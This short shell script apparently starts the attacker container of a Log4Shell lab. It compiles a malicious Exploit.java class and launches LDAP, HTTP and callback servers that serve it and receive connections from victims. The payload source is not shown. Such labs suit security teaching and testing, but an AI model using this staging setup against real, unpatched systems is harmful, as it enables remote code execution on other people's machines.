#!/bin/sh
# =====================================================
# 攻擊者容器啟動腳本
# =====================================================

echo "========================================"
echo "🔓 Log4Shell Attacker Server"
echo "========================================"

# 編譯惡意 Java 類別
echo "[*] Compiling malicious Exploit.java..."
cd /app

# 使用 Java 8 編譯（目標也是 Java 8）
/usr/lib/jvm/java-1.8-openjdk/bin/javac -source 1.8 -target 1.8 Exploit.java

if [ $? -eq 0 ]; then
    echo "[+] Exploit.class compiled successfully"
else
    echo "[-] Failed to compile Exploit.java"
    exit 1
fi

# 顯示服務資訊
echo ""
echo "[*] Starting attack servers..."
echo "    LDAP Server:     ldap://0.0.0.0:1389"
echo "    HTTP Server:     http://0.0.0.0:8888"
echo "    Callback Server: http://0.0.0.0:9999"
echo ""
echo "[*] Logs will be written to /var/log/attacker.log"
echo "========================================"

# 啟動 Python 伺服器
exec python /app/server.py
